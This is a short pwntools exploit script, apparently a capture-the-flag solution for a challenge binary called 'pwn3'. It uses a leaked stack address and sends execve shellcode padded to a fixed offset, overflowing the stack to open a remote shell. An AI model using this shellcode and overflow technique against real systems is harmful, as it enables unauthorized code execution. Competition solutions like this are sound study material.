#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


context(arch="i386", os="linux", endian="little")

class Pwn:
    def __init__(self):
        self.e = ELF("./pwn3")
        self.offset = 242
        self.p = None

    def start_binary(self):
#        self.p = process("./pwn3")
        self.p = remote("pwn.ctf.tamu.edu", 4323)
        self.p.recvuntil("number ")

    def pwn_binary(self):
        shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        self.start_binary()

        data = self.p.recvuntil("echo? ")
        data = data[:10]
        leak_stack = int(data, 16)

        self.p.send(shellcode + "A"*(self.offset-len(shellcode)) + p32(leak_stack))

        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
